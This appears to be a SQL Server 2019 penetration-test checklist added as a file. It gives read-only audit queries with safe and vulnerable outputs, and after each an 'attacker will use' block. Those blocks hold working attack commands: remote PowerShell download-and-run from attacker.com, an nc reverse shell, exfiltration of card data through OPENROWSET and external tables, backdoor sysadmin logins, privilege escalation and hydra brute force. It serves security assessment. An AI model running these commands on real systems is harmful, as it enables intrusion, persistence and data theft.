@@ -1,0 +1,1320 @@
+================================================================
+ATTACKER'S SQL SERVER 2019 PENTEST COMMANDS
+READ-ONLY RECONNAISSANCE & VULNERABILITY IDENTIFICATION
+================================================================
+
+Purpose: Identify actual attack vectors, privilege escalation paths,
+credential exposures, and data exfiltration opportunities.
+
+IMPORTANT:
+- ALL COMMANDS ARE READ-ONLY - No modifications
+- Run database-level commands in EVERY in-scope database
+- Validate findings before reporting
+- Check business justification - enabled != vulnerable
+- Do NOT extract secrets/hashes/private keys
+
+
+================================================================
+1. XP_CMDSHELL - OS COMMAND EXECUTION (RCE)
+================================================================
+
+COMMAND:
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'xp_cmdshell';
+
+PURPOSE: Check if OS command execution is possible
+
+SAFE OUTPUT:
+name        | value_in_use
+------------|-------------
+xp_cmdshell | 0
+
+SAFE DESCRIPTION: 
+xp_cmdshell is disabled. Attacker cannot execute OS commands directly.
+
+VULNERABLE OUTPUT:
+name        | value_in_use
+------------|-------------
+xp_cmdshell | 1
+
+VULNERABLE DESCRIPTION:
+xp_cmdshell is ENABLED. Attacker can execute any OS command with SQL Server 
+service account privileges.
+
+ATTACKER WILL USE:
+EXEC xp_cmdshell 'whoami';
+EXEC xp_cmdshell 'ipconfig /all';
+EXEC xp_cmdshell 'net user hacker P@ssw0rd /add';
+EXEC xp_cmdshell 'net localgroup administrators hacker /add';
+EXEC xp_cmdshell 'powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://attacker.com/ps.ps1'')"';
+
+SEVERITY: CRITICAL
+IMPACT: Full OS compromise, Domain takeover possible if service account is privileged
+
+
+================================================================
+2. CLR (COMMON LANGUAGE RUNTIME) - CODE EXECUTION
+================================================================
+
+COMMAND:
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name IN ('clr enabled', 'clr strict security');
+
+PURPOSE: Check if .NET code execution is possible
+
+SAFE OUTPUT:
+name            | value_in_use
+----------------|-------------
+clr enabled     | 0
+clr strict security | 1
+
+SAFE DESCRIPTION:
+CLR is disabled or running with strict security. Attacker cannot execute custom .NET code.
+
+VULNERABLE OUTPUT:
+name            | value_in_use
+----------------|-------------
+clr enabled     | 1
+clr strict security | 0
+
+VULNERABLE DESCRIPTION:
+CLR enabled with UNSAFE assemblies allowed. Attacker can create and execute 
+malicious .NET assemblies with SYSTEM/ADMIN privileges.
+
+ATTACKER WILL USE:
+CREATE ASSEMBLY Malicious
+FROM 0x4D5A90000300000004000000FFFF0000... -- Hex of malicious .NET DLL
+WITH PERMISSION_SET = UNSAFE;
+
+CREATE PROCEDURE Exploit 
+AS EXTERNAL NAME Malicious.Class.Method;
+
+EXEC Exploit; -- Executes arbitrary .NET code with SQL Server service account
+
+SEVERITY: CRITICAL
+IMPACT: Full server compromise, code execution with service account privileges
+
+
+================================================================
+3. OLE AUTOMATION PROCEDURES - RCE
+================================================================
+
+COMMAND:
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'Ole Automation Procedures';
+
+PURPOSE: Check if OLE automation can be used for command execution
+
+SAFE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ole Automation Procedures | 0
+
+SAFE DESCRIPTION:
+OLE Automation is disabled. Cannot use COM objects for command execution.
+
+VULNERABLE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ole Automation Procedures | 1
+
+VULNERABLE DESCRIPTION:
+OLE Automation ENABLED. Attacker can use WScript.Shell to execute OS commands.
+
+ATTACKER WILL USE:
+DECLARE @cmd INT;
+EXEC sp_OACreate 'WScript.Shell', @cmd OUTPUT;
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'cmd.exe /c whoami > C:\temp\out.txt';
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/beacon.exe -OutFile C:\temp\beacon.exe"';
+EXEC sp_OAMethod @cmd, 'Run', NULL, 'C:\temp\beacon.exe';
+
+SEVERITY: HIGH
+IMPACT: OS command execution, malware installation
+
+
+================================================================
+4. AD HOC DISTRIBUTED QUERIES - DATA EXFILTRATION
+================================================================
+
+COMMAND:
+SELECT name, value_in_use 
+FROM sys.configurations 
+WHERE name = 'Ad Hoc Distributed Queries';
+
+PURPOSE: Check if remote data access is possible
+
+SAFE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ad Hoc Distributed Queries | 0
+
+SAFE DESCRIPTION:
+Ad Hoc queries disabled. Cannot connect to remote data sources.
+
+VULNERABLE OUTPUT:
+name                    | value_in_use
+------------------------|-------------
+Ad Hoc Distributed Queries | 1
+
+VULNERABLE DESCRIPTION:
+Ad Hoc Distributed Queries ENABLED. Attacker can connect to remote servers 
+and exfiltrate data or execute commands.
+
+ATTACKER WILL USE:
+-- Exfiltrate data to attacker server
+SELECT * INTO #temp 
+FROM OPENROWSET('SQLNCLI', 
+                'Server=attacker.com;Trusted_Connection=yes;', 
+                'SELECT * FROM CreditCards');
+
+-- Or send data directly
+INSERT INTO OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes;',
+                       'SELECT * FROM CreditCards')
+SELECT * FROM CreditCards;
+
+-- Execute commands on remote server
+SELECT * FROM OPENROWSET('SQLNCLI', 'Server=attacker.com;Trusted_Connection=yes;',
+                         'EXEC xp_cmdshell ''whoami''');
+
+SEVERITY: HIGH
+IMPACT: Data theft, lateral movement
+
+
+================================================================
+5. STORED CREDENTIALS INVENTORY
+================================================================
+
+COMMAND:
+SELECT name, credential_identity, create_date, modify_date
+FROM sys.credentials;
+
+PURPOSE: Find stored credentials that can be abused
+
+SAFE OUTPUT:
+name | credential_identity | create_date | modify_date
+-----|---------------------|-------------|------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No credentials stored in system.
+
+VULNERABLE OUTPUT:
+name                | credential_identity   | create_date         | modify_date
+--------------------|-----------------------|---------------------|--------------------
+AzureCredential     | storageaccount        | 2024-01-15 10:00:00 | 2024-01-15 10:00:00
+AdminProxyCred      | DOMAIN\Administrator  | 2024-02-20 14:30:00 | 2024-02-20 14:30:00
+ETLProxyCred        | DOMAIN\svc_etl        | 2024-03-01 09:00:00 | 2024-03-01 09:00:00
+BackupCred          | DOMAIN\svc_backup     | 2024-04-10 11:00:00 | 2024-04-10 11:00:00
+
+VULNERABLE DESCRIPTION:
+Stored credentials exist with various privileges. Low-privileged users who can 
+use these credentials can escalate privileges.
+
+ATTACKER WILL USE:
+-- Check if proxy exists with this credential
+SELECT p.name, p.enabled, c.credential_identity
+FROM msdb.dbo.sysproxies p
+JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE c.name = 'AdminProxyCred';
+
+-- If proxy accessible, execute commands with those credentials
+EXEC msdb.dbo.sp_start_job @job_name = 'AdminJob';
+
+SEVERITY: HIGH
+IMPACT: Privilege escalation, lateral movement
+
+
+================================================================
+6. DATABASE-SCOPED CREDENTIALS
+================================================================
+
+COMMAND:
+SELECT name, credential_id, create_date
+FROM sys.database_scoped_credentials;
+
+PURPOSE: Find database-level stored credentials (run in each DB)
+
+SAFE OUTPUT:
+name | credential_id | create_date
+-----|---------------|------------
+(0 rows affected)
+
+VULNERABLE OUTPUT:
+name                        | credential_id | create_date
+----------------------------|---------------|--------------------
+AzureStorageCredential      | 1             | 2024-01-15 10:00:00
+ExternalTableCredential     | 2             | 2024-02-20 14:30:00
+AdminCredential             | 3             | 2024-06-01 08:00:00
+
+VULNERABLE DESCRIPTION:
+Database-scoped credentials stored. Can be used for external data access.
+
+ATTACKER WILL USE:
+-- Check external data sources using these credentials
+SELECT name, type_desc, location 
+FROM sys.external_data_sources;
+
+-- Create external table to exfiltrate data
+CREATE EXTERNAL TABLE DataExfil 
+WITH (LOCATION = 'https://attacker.blob.core.windows.net/steal/')
+AS SELECT * FROM CreditCards;
+
+SEVERITY: HIGH
+IMPACT: Data exfiltration to external locations
+
+
+================================================================
+7. IMPERSONATION PERMISSIONS - PRIVILEGE ESCALATION
+================================================================
+
+COMMAND:
+-- Server-level impersonation
+SELECT p.name AS grantee, p.type_desc, p2.name AS target_principal
+FROM sys.server_permissions sp
+JOIN sys.server_principals p ON sp.grantee_principal_id = p.principal_id
+JOIN sys.server_principals p2 ON sp.major_id = p2.principal_id
+WHERE sp.permission_name = 'IMPERSONATE';
+
+-- Database-level impersonation (run in each database)
+SELECT g.name AS grantee, g.type_desc, p.permission_name, p.state_desc
+FROM sys.database_permissions p
+JOIN sys.database_principals g ON p.grantee_principal_id = g.principal_id
+WHERE p.permission_name = 'IMPERSONATE';
+
+PURPOSE: Find impersonation opportunities for privilege escalation
+
+SAFE OUTPUT:
+grantee | target
+--------|-------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No impersonation permissions granted.
+
+VULNERABLE OUTPUT (Server):
+grantee    | target
+-----------|-------
+app_user   | sa
+test_user  | DOMAIN\admin
+app_user   | DOMAIN\svc_sql
+
+VULNERABLE OUTPUT (Database):
+grantee    | permission_name
+-----------|----------------
+app_user   | IMPERSONATE
+test_user  | IMPERSONATE
+
+VULNERABLE DESCRIPTION:
+Users can impersonate high-privileged accounts. This leads to privilege escalation.
+
+ATTACKER WILL USE:
+-- Impersonate sa
+EXECUTE AS LOGIN = 'sa';
+
+-- Now attacker has all sysadmin privileges
+SELECT * FROM sys.sql_logins; -- See all logins
+SELECT * FROM sys.database_permissions; -- See all permissions
+CREATE LOGIN attacker WITH PASSWORD = 'hacked!'; -- Create new login
+ALTER SERVER ROLE sysadmin ADD MEMBER attacker; -- Add to sysadmin
+
+-- Revert back (if needed)
+REVERT;
+
+SEVERITY: CRITICAL
+IMPACT: Complete database takeover, privilege escalation
+
+
+================================================================
+8. TRUSTWORTHY DATABASES - PRIVILEGE ESCALATION
+================================================================
+
+COMMAND:
+SELECT name, is_trustworthy_on, is_db_chaining_on, 
+       SUSER_SNAME(owner_sid) AS owner_name
+FROM sys.databases
+WHERE is_trustworthy_on = 1 OR is_db_chaining_on = 1;
+
+PURPOSE: Identify TRUSTWORTHY databases for privilege escalation
+
+SAFE OUTPUT:
+name | is_trustworthy_on | is_db_chaining_on | owner_name
+-----|-------------------|-------------------|-----------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No databases with TRUSTWORTHY or chaining enabled.
+
+VULNERABLE OUTPUT:
+name        | is_trustworthy_on | is_db_chaining_on | owner_name
+------------|-------------------|-------------------|-----------
+ProductionDB| 1                 | 0                 | sa
+SalesDB     | 0                 | 1                 | DOMAIN\admin
+HRDB        | 1                 | 1                 | DOMAIN\svc_app
+
+VULNERABLE DESCRIPTION:
+TRUSTWORTHY ON with high-privilege owner allows cross-database privilege escalation.
+Database chaining allows access to objects across databases without permission checks.
+
+ATTACKER WILL USE:
+-- With TRUSTWORTHY ON and db_owner access
+USE ProductionDB;
+CREATE PROCEDURE sp_Escalate
+AS EXECUTE AS OWNER  -- Runs as 'sa'
+BEGIN
+   -- Add current user to sysadmin
+   EXEC sp_addsrvrolemember 'app_user', 'sysadmin';
+END;
+-- Execute the procedure
+EXEC sp_Escalate;
+
+-- With database chaining
+USE SalesDB;
+CREATE PROCEDURE sp_CrossDB
+AS
+BEGIN
+   -- Access objects in other databases without permission checks
+   SELECT * FROM ProductionDB.dbo.CreditCards;
+   SELECT * FROM HRDB.dbo.EmployeeSalaries;
+END;
+
+SEVERITY: CRITICAL
+IMPACT: Privilege escalation, cross-database data access
+
+
+================================================================
+9. LINKED SERVERS - LATERAL MOVEMENT
+================================================================
+
+COMMAND:
+-- List all linked servers
+EXEC sp_linkedservers;
+
+-- Check security settings
+SELECT name, product, provider, data_source, is_linked,
+       is_rpc_out_enabled, is_data_access_enabled, 
+       is_remote_login_enabled, is_rpc_enabled
+FROM sys.servers WHERE is_linked = 1 ORDER BY name;
+
+PURPOSE: Find lateral movement opportunities
+
+SAFE OUTPUT:
+name | is_rpc_out_enabled | is_data_access_enabled
+-----|-------------------|-----------------------
+(0 rows affected) or all values 0
+
+SAFE DESCRIPTION:
+No linked servers or all security features disabled.
+
+VULNERABLE OUTPUT:
+name          | product    | is_linked | is_rpc_out_enabled | is_data_access_enabled
+--------------|------------|-----------|--------------------|------------------------
+PROD_SERVER   | SQL Server | 1         | 1                  | 1
+DEV_SERVER    | SQL Server | 1         | 1                  | 0
+ORACLE_SERVER | Oracle     | 1         | 0                  | 1
+
+VULNERABLE DESCRIPTION:
+Linked servers with RPC out or data access enabled allow lateral movement.
+
+ATTACKER WILL USE:
+-- Execute commands on remote server
+EXEC ('EXEC xp_cmdshell ''whoami''') AT PROD_SERVER;
+EXEC ('SELECT * FROM sys.dm_exec_sessions') AT PROD_SERVER;
+
+-- Query remote data and exfiltrate
+SELECT * INTO #remote_data
+FROM OPENQUERY(PROD_SERVER, 'SELECT * FROM CreditCards');
+
+-- Send data to remote server
+INSERT INTO OPENQUERY(PROD_SERVER, 'SELECT * FROM StolenData')
+SELECT * FROM CreditCards;
+
+SEVERITY: HIGH
+IMPACT: Lateral movement, data theft, server compromise
+
+
+================================================================
+10. PUBLIC ROLE PERMISSIONS - UNAUTHORIZED ACCESS
+================================================================
+
+COMMAND:
+SELECT p.state_desc, p.permission_name,
+       OBJECT_SCHEMA_NAME(p.major_id) AS object_schema,
+       OBJECT_NAME(p.major_id) AS object_name
+FROM sys.database_permissions p
+WHERE p.grantee_principal_id = DATABASE_PRINCIPAL_ID('public')
+AND p.permission_name IN ('SELECT', 'EXECUTE', 'CONTROL', 'ALTER', 'INSERT', 'UPDATE', 'DELETE');
+
+PURPOSE: Check what PUBLIC role can access (run in each DB)
+
+SAFE OUTPUT:
+state_desc | permission_name | object_schema | object_name
+-----------|-----------------|---------------|------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+PUBLIC role has no sensitive permissions.
+
+VULNERABLE OUTPUT:
+state_desc | permission_name | object_schema | object_name
+-----------|-----------------|---------------|------------
+GRANT      | SELECT          | dbo           | Users
+GRANT      | SELECT          | dbo           | CreditCards
+GRANT      | SELECT          | dbo           | EmployeeSalaries
+GRANT      | EXECUTE         | dbo           | sp_AdminResetPassword
+GRANT      | EXECUTE         | dbo           | sp_ExportAllData
+GRANT      | INSERT          | dbo           | AuditLog
+
+VULNERABLE DESCRIPTION:
+PUBLIC role has access to sensitive tables or procedures. ANY user (including 
+anonymous) can access sensitive data or execute admin procedures.
+
+ATTACKER WILL USE:
+-- Without any authentication
+SELECT * FROM Users; -- All user data including passwords?
+SELECT * FROM CreditCards; -- Credit card information
+SELECT * FROM EmployeeSalaries; -- Salary information
+
+-- Execute sensitive procedures
+EXEC sp_AdminResetPassword 'admin_user', 'newpassword';
+EXEC sp_ExportAllData; -- Export all database data
+
+SEVERITY: HIGH
+IMPACT: Data breach, unauthorized access
+
+
+================================================================
+11. GUEST USER ACCESS - UNAUTHORIZED ACCESS
+================================================================
+
+COMMAND:
+SELECT name, authentication_type_desc
+FROM sys.database_principals WHERE name = 'guest';
+
+PURPOSE: Check if guest user is enabled (run in each DB)
+
+SAFE OUTPUT:
+name  | authentication_type_desc
+------|--------------------------
+guest | NONE
+
+SAFE DESCRIPTION:
+Guest user is disabled. Cannot access database without proper login.
+
+VULNERABLE OUTPUT:
+name  | authentication_type_desc
+------|--------------------------
+guest | INSTANCE
+
+VULNERABLE DESCRIPTION:
+Guest user ENABLED. Anyone (including unauthorized users) can access 
+database objects.
+
+ATTACKER WILL USE:
+-- Connect without providing credentials
+-- If database has guest enabled
+SELECT * FROM sensitive_table;
+SELECT * FROM CreditCards;
+SELECT * FROM Users;
+
+SEVERITY: MEDIUM
+IMPACT: Unauthorized data access
+
+
+================================================================
+12. SA ACCOUNT STATUS - BRUTE FORCE TARGET
+================================================================
+
+COMMAND:
+SELECT name, is_disabled, is_policy_checked, is_expiration_checked,
+       default_database_name
+FROM sys.sql_logins WHERE name = 'sa';
+
+PURPOSE: Check SA account status
+
+SAFE OUTPUT:
+name | is_disabled | is_policy_checked | is_expiration_checked | default_database_name
+-----|-------------|-------------------|-----------------------|----------------------
+sa   | 1           | 1                 | 1                     | master
+
+SAFE DESCRIPTION:
+SA account is DISABLED. No brute force attack possible on SA.
+
+VULNERABLE OUTPUT:
+name | is_disabled | is_policy_checked | is_expiration_checked | default_database_name
+-----|-------------|-------------------|-----------------------|----------------------
+sa   | 0           | 0                 | 0                     | master
+
+VULNERABLE DESCRIPTION:
+SA account ENABLED with weak/disabled password policy. Perfect target for 
+brute force attacks.
+
+ATTACKER WILL USE:
+-- Hydra/Medusa brute force on SA account
+hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://target_ip
+
+-- Common passwords to try
+sa / password
+sa / admin
+sa / 123456
+sa / P@ssw0rd
+sa / sqlserver
+
+-- If successful
+EXEC sp_addsrvrolemember 'attacker_login', 'sysadmin';
+
+SEVERITY: CRITICAL
+IMPACT: Full database takeover via brute force
+
+
+================================================================
+13. ORPHANED USERS - PERSISTENCE/BACKDOOR
+================================================================
+
+COMMAND:
+SELECT dp.name AS database_user, dp.type_desc, dp.authentication_type_desc
+FROM sys.database_principals dp
+LEFT JOIN sys.server_principals sp ON dp.sid = sp.sid
+WHERE dp.authentication_type = 1 AND dp.principal_id > 4
+AND sp.sid IS NULL;
+
+PURPOSE: Find orphaned users for potential backdoor (run in each DB)
+
+SAFE OUTPUT:
+database_user | type_desc | authentication_type_desc
+--------------|-----------|--------------------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No orphaned users found.
+
+VULNERABLE OUTPUT:
+database_user | type_desc | authentication_type_desc
+--------------|-----------|--------------------------
+old_admin     | SQL_USER  | INSTANCE
+test_user     | SQL_USER  | INSTANCE
+backup_account| SQL_USER  | INSTANCE
+dev_user      | SQL_USER  | INSTANCE
+
+VULNERABLE DESCRIPTION:
+Orphaned users exist - server login deleted but database user remains.
+Attacker might re-create login with same SID to regain access.
+
+ATTACKER WILL USE:
+-- Check orphaned user SID
+SELECT dp.sid, dp.name FROM sys.database_principals dp
+WHERE dp.name = 'old_admin';
+
+-- Create login with same SID
+CREATE LOGIN old_admin WITH PASSWORD = 'hacked!', SID = <same_sid>;
+
+-- Now has access to all databases where orphaned user exists
+ALTER SERVER ROLE sysadmin ADD MEMBER old_admin;
+
+SEVERITY: MEDIUM
+IMPACT: Persistence, backdoor access
+
+
+================================================================
+14. SENSITIVE COLUMNS - PLAINTEXT DATA EXPOSURE
+================================================================
+
+COMMAND:
+SELECT SCHEMA_NAME(t.schema_id) AS schema_name,
+       t.name AS table_name,
+       c.name AS column_name,
+       ty.name AS data_type
+FROM sys.tables t
+JOIN sys.columns c ON t.object_id = c.object_id
+JOIN sys.types ty ON c.user_type_id = ty.user_type_id
+WHERE c.name LIKE '%password%' OR c.name LIKE '%pass%'
+   OR c.name LIKE '%secret%' OR c.name LIKE '%token%'
+   OR c.name LIKE '%key%' OR c.name LIKE '%apikey%'
+   OR c.name LIKE '%ssn%' OR c.name LIKE '%social%'
+   OR c.name LIKE '%card%' OR c.name LIKE '%credit%'
+   OR c.name LIKE '%account%' OR c.name LIKE '%bank%'
+   OR c.name LIKE '%auth%' OR c.name LIKE '%credential%'
+   OR c.name LIKE '%salary%' OR c.name LIKE '%sin%'
+ORDER BY schema_name, table_name, column_name;
+
+PURPOSE: Find potential sensitive data columns (run in each DB)
+
+SAFE OUTPUT:
+schema_name | table_name | column_name | data_type
+------------|------------|-------------|-----------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No sensitive column names found.
+
+VULNERABLE OUTPUT:
+schema_name | table_name     | column_name      | data_type
+------------|----------------|------------------|-----------
+dbo         | Users          | password         | nvarchar
+dbo         | Users          | password_salt    | varbinary
+dbo         | Users          | auth_token       | nvarchar
+dbo         | Customers      | credit_card      | nvarchar
+dbo         | Customers      | ssn              | nvarchar
+dbo         | Employees      | salary           | money
+dbo         | API_Keys       | api_key          | nvarchar
+dbo         | Audit          | access_token     | nvarchar
+dbo         | Banking        | account_number   | nvarchar
+
+VULNERABLE DESCRIPTION:
+Sensitive columns found. If data is stored in plaintext (varchar/nvarchar types),
+attacker can extract sensitive information.
+
+ATTACKER WILL USE:
+-- Extract plaintext passwords
+SELECT username, password FROM Users;
+-- Extract credit card info
+SELECT name, credit_card, ssn FROM Customers;
+-- Extract API keys
+SELECT app_name, api_key FROM API_Keys;
+-- Extract sensitive data
+SELECT employee_name, salary FROM Employees;
+
+-- If encryption is not used
+-- All data is directly readable
+
+SEVERITY: HIGH
+IMPACT: Data breach, credential theft
+
+
+================================================================
+15. SQL AGENT JOBS - COMMAND EXECUTION & PERSISTENCE
+================================================================
+
+COMMAND:
+SELECT j.name AS job_name, j.enabled, 
+       js.step_id, js.step_name, 
+       js.subsystem, js.database_name, js.proxy_id,
+       p.name AS proxy_name, p.enabled AS proxy_enabled,
+       c.credential_identity
+FROM msdb.dbo.sysjobs j
+JOIN msdb.dbo.sysjobsteps js ON j.job_id = js.job_id
+LEFT JOIN msdb.dbo.sysproxies p ON js.proxy_id = p.proxy_id
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE j.enabled = 1
+AND js.subsystem IN ('CmdExec', 'PowerShell', 'ActiveScripting')
+ORDER BY j.name, js.step_id;
+
+PURPOSE: Find job steps with OS command execution
+
+SAFE OUTPUT:
+job_name | step_id | step_name | subsystem | proxy_name
+---------|---------|-----------|-----------|-----------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No jobs with CmdExec or PowerShell steps.
+
+VULNERABLE OUTPUT:
+job_name       | step_id | step_name   | subsystem | proxy_name    | credential_identity
+---------------|---------|-------------|-----------|---------------|--------------------
+Backup_Job     | 1       | Backup      | CmdExec   | NULL          | NULL
+ETL_Process    | 2       | Transform   | PowerShell| ETL_Proxy     | DOMAIN\svc_etl
+Admin_Job      | 1       | Maintenance | CmdExec   | Admin_Proxy   | DOMAIN\Administrator
+Deploy_Job     | 1       | Deploy      | PowerShell| Deploy_Proxy  | DOMAIN\admin
+
+VULNERABLE DESCRIPTION:
+SQL Agent jobs with OS command execution enabled. Can be modified or executed 
+to run arbitrary commands.
+
+ATTACKER WILL USE:
+-- Modify job step to execute malicious command
+EXEC msdb.dbo.sp_update_jobstep 
+@job_id = (SELECT job_id FROM msdb.dbo.sysjobs WHERE name = 'Backup_Job'),
+@step_id = 1,
+@command = 'nc -e cmd.exe attacker.com 4444';
+
+-- Execute the job
+EXEC msdb.dbo.sp_start_job @job_name = 'Backup_Job';
+
+-- Or create new job for persistence
+EXEC msdb.dbo.sp_add_job @job_name = 'Persistence_Job';
+EXEC msdb.dbo.sp_add_jobstep @job_name = 'Persistence_Job',
+  @step_name = 'Reverse_Shell',
+  @subsystem = 'CmdExec',
+  @command = 'powershell -c "Invoke-Expression (New-Object Net.WebClient).DownloadString(''http://attacker.com/rev.ps1'')"';
+
+SEVERITY: HIGH
+IMPACT: Command execution, persistence, lateral movement
+
+
+================================================================
+16. SQL AGENT PROXIES - PRIVILEGE ESCALATION
+================================================================
+
+COMMAND:
+SELECT p.name AS proxy_name, p.enabled, 
+       c.name AS credential_name,
+       c.credential_identity,
+       (SELECT COUNT(*) FROM msdb.dbo.sysproxysubsystem ps 
+        WHERE ps.proxy_id = p.proxy_id) AS subsystem_count
+FROM msdb.dbo.sysproxies p
+LEFT JOIN sys.credentials c ON p.credential_id = c.credential_id
+WHERE p.enabled = 1;
+
+PURPOSE: Find proxies with high privileges
+
+SAFE OUTPUT:
+proxy_name | enabled | credential_name | credential_identity | subsystem_count
+-----------|---------|-----------------|---------------------|----------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No proxies configured.
+
+VULNERABLE OUTPUT:
+proxy_name  | enabled | credential_name | credential_identity | subsystem_count
+------------|---------|-----------------|---------------------|----------------
+Admin_Proxy | 1       | AdminCred       | DOMAIN\Administrator| 3
+ETL_Proxy   | 1       | ETLCred         | DOMAIN\svc_etl      | 2
+Backup_Proxy| 1       | BackupCred      | DOMAIN\svc_backup   | 1
+SAP_Proxy   | 1       | SAPCred         | DOMAIN\sa_sap       | 4
+
+VULNERABLE DESCRIPTION:
+Proxies with high-privileged credentials exist. Users with access to 
+these proxies can execute commands with those privileges.
+
+ATTACKER WILL USE:
+-- Check which users can use proxies
+SELECT p.name AS proxy_name, pl.principal_id, pp.name AS principal_name
+FROM msdb.dbo.sysproxies p
+JOIN msdb.dbo.sysproxylogin pl ON p.proxy_id = pl.proxy_id
+JOIN sys.server_principals pp ON pl.principal_id = pp.principal_id;
+
+-- If attacker is in allowed list, create job with this proxy
+EXEC msdb.dbo.sp_add_job @job_name = 'Elevated_Job';
+EXEC msdb.dbo.sp_add_jobstep @job_name = 'Elevated_Job',
+  @step_name = 'Elevated_Cmd',
+  @subsystem = 'CmdExec',
+  @command = 'whoami > C:\temp\privilege.txt',
+  @proxy_name = 'Admin_Proxy';
+
+SEVERITY: HIGH
+IMPACT: Privilege escalation
+
+
+================================================================
+17. UNENCRYPTED NETWORK CONNECTIONS - CREDENTIAL SNIFFING
+================================================================
+
+COMMAND:
+SELECT c.session_id, s.login_name, s.host_name, s.program_name,
+       c.client_net_address, c.net_transport, c.auth_scheme, c.encrypt_option
+FROM sys.dm_exec_connections c
+JOIN sys.dm_exec_sessions s ON c.session_id = s.session_id
+WHERE c.net_transport = 'TCP' AND c.client_net_address != '127.0.0.1'
+ORDER BY c.session_id;
+
+PURPOSE: Find unencrypted remote connections
+
+SAFE OUTPUT:
+session_id | login_name | host_name | encrypt_option
+-----------|------------|-----------|---------------
+(0 rows affected) or all encrypt_option = TRUE
+
+SAFE DESCRIPTION:
+All remote connections are encrypted with TLS.
+
+VULNERABLE OUTPUT:
+session_id | login_name | host_name    | program_name | encrypt_option
+-----------|------------|--------------|--------------|---------------
+51         | app_user   | APP-SERVER   | SQL Server   | FALSE
+52         | sa         | ADMIN-PC     | SSMS         | FALSE
+53         | test_user  | HACKER-PC    | SQLCMD       | FALSE
+54         | DOMAIN\svc | APP-SERVER   | SQL Agent    | FALSE
+
+VULNERABLE DESCRIPTION:
+Unencrypted connections found. Credentials and data flow in plaintext.
+
+ATTACKER WILL USE:
+-- On same network, use Wireshark to capture packets
+-- Filter for TDS protocol (port 1433)
+-- Extract login credentials from packets
+-- Usernames and passwords visible in plaintext
+-- All SQL queries and results visible
+
+Example captured packet contents:
+LOGIN: app_user
+PASSWORD: Password123!
+QUERY: SELECT * FROM CreditCards
+RESULT: All credit card numbers visible
+
+SEVERITY: HIGH
+IMPACT: Credential theft, data exposure
+
+
+================================================================
+18. EXTERNAL DATA SOURCES - DATA EXFILTRATION
+================================================================
+
+COMMAND:
+SELECT name, type_desc, location, connection_options
+FROM sys.external_data_sources;
+
+PURPOSE: Find potential data exfiltration paths (run in each DB)
+
+SAFE OUTPUT:
+name | type_desc | location | connection_options
+-----|-----------|----------|-------------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+No external data sources configured.
+
+VULNERABLE OUTPUT:
+name                | type_desc | location                      | connection_options
+--------------------|-----------|-------------------------------|-------------------
+AzureBlobSource     | BLOB      | https://storage.blob.core...  | null
+HadoopExternal      | HADOOP    | wasb://container@storage...   | null
+ExternalDBSource    | REMOTE    | https://external.db...        | null
+
+VULNERABLE DESCRIPTION:
+External data sources exist. Attacker can create external tables to exfiltrate 
+data to these locations.
+
+ATTACKER WILL USE:
+-- Create external table to exfiltrate data
+CREATE EXTERNAL TABLE DataExfil 
+WITH (
+  LOCATION = 'https://attacker.blob.core.windows.net/steal/',
+  DATA_SOURCE = AzureBlobSource
+) 
+AS SELECT * FROM CreditCards;
+
+-- Or use external data source to exfiltrate
+INSERT INTO ExternalTable (col1, col2)
+SELECT credit_card_number, expiry_date FROM CreditCards;
+
+SEVERITY: HIGH
+IMPACT: Data exfiltration
+
+
+================================================================
+19. DATABASE MASTER KEY WEAKNESSES
+================================================================
+
+COMMAND:
+SELECT name, key_length, algorithm_desc, create_date, modify_date
+FROM sys.symmetric_keys
+WHERE name = '##MS_DatabaseMasterKey##';
+
+PURPOSE: Check database master key encryption strength
+
+SAFE OUTPUT:
+name                         | key_length | algorithm_desc | create_date
+-----------------------------|------------|----------------|------------
+##MS_DatabaseMasterKey##     | 256        | AES_256        | 2024-01-01
+
+SAFE DESCRIPTION:
+Strong encryption (AES-256) used for master key.
+
+VULNERABLE OUTPUT:
+name                         | key_length | algorithm_desc | create_date
+-----------------------------|------------|----------------|------------
+##MS_DatabaseMasterKey##     | 128        | TRIPLE_DES_3KEY| 2019-01-01
+##MS_DatabaseMasterKey##     | 128        | TRIPLE_DES_3KEY| 2020-06-15
+##MS_DatabaseMasterKey##     | 128        | DES            | 2015-01-01
+
+VULNERABLE DESCRIPTION:
+Weak encryption algorithm used for database master key. May be vulnerable 
+to cryptographic attacks.
+
+ATTACKER WILL USE:
+-- Backup database master key (if permissions allow)
+BACKUP SERVICE MASTER KEY TO FILE = 'C:\temp\smk.bak' 
+  ENCRYPTION BY PASSWORD = 'weakpassword';
+
+-- Try to crack weak encryption
+-- Dictionary attack on the encryption key
+-- If successful, decrypt all database encryption keys
+
+SEVERITY: MEDIUM
+IMPACT: Decryption of all encrypted data
+
+
+================================================================
+20. CERTIFICATE WEAKNESSES
+================================================================
+
+COMMAND:
+SELECT name, subject, issuer_name, expiry_date, start_date,
+       pvt_key_encryption_type_desc
+FROM sys.certificates
+WHERE expiry_date < GETDATE() 
+   OR pvt_key_encryption_type_desc = 'PW'
+   OR subject LIKE '%test%' OR subject LIKE '%unknown%';
+
+PURPOSE: Find weak or expired certificates
+
+SAFE OUTPUT:
+name | subject | issuer_name | expiry_date | pvt_key_encryption_type_desc
+-----|---------|-------------|-------------|----------------------------
+(0 rows affected)
+
+SAFE DESCRIPTION:
+All certificates are valid and properly protected.
+
